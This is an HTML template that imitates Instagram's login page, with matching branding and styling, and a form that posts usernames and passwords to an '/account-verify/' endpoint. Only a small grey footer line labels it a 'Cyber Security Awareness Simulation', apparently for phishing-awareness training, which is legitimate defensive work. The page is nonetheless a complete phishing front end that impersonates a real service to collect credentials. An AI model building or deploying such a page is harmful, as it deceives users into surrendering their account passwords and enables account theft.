<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Instagram</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body{
    background:#fafafa;
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
}
.container{
    width:350px;
    margin:60px auto;
    background:#fff;
    border:1px solid #dbdbdb;
    padding:40px 40px 30px;
    text-align:center;
}
.logo{
    font-family:Arial, Helvetica, sans-serif;
    font-size:36px;
    font-weight:600;
    margin-bottom:30px;
}
input{
    width:100%;
    padding:10px;
    margin:6px 0;
    border:1px solid #dbdbdb;
    background:#fafafa;
    border-radius:4px;
}
button{
    width:100%;
    background:#0095f6;
    border:none;
    color:white;
    padding:10px;
    font-weight:600;
    border-radius:8px;
    margin-top:12px;
    cursor:pointer;
}
.or{
    margin:20px 0;
    color:#8e8e8e;
    font-size:13px;
}
.fb{
    color:#385185;
    font-weight:600;
    margin-bottom:12px;
}
.link{
    font-size:13px;
    color:#00376b;
    margin-top:10px;
}
.footer{
    margin-top:25px;
    font-size:14px;
}
.signup{
    color:#0095f6;
    font-weight:600;
}
.lab{
    margin-top:15px;
    font-size:11px;
    color:#8e8e8e;
}
</style>
</head>

<body>

<div class="container">
    <div class="logo">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" 
         style="width:32px; vertical-align:middle; margin-right:8px;">
    Instagram
</div>


    <form method="POST" action="/account-verify/">
        {% csrf_token %}
        <input name="username" placeholder="Phone number, username, or email" required>
        <input name="password" type="password" placeholder="Password" required>
        <button type="submit">Log in</button>
    </form>

    <div class="or">OR</div>

    <div class="fb">Log in with Facebook</div>

    <div class="link">Forgot password?</div>

    <div class="footer">
        Don't have an account? <span class="signup">Sign up</span>
    </div>

    <div class="lab">
        Cyber Security Awareness Simulation
    </div>
</div>

</body>
</html>
